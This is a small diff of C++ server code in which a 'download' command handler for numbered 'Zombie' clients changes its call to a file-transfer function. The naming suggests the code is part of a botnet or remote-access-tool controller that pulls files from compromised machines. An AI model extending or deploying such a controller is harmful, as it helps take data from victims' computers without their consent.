@@ -18,7 +18,7 @@ void listen_client(Server* serv1, const unsigned short nb)
 			}
 			else if (args[0] == "download" && args.size() == 2)
 			{
-				Transfer::downloadFromClient(serv1,clients[nb].sock, args[1]);
+				Transfer::downloadFromClient(serv1, args[1]);
 			}
 			else
 				print_status("Zombie " + std::to_string(nb + 1) + ": " + buffer);
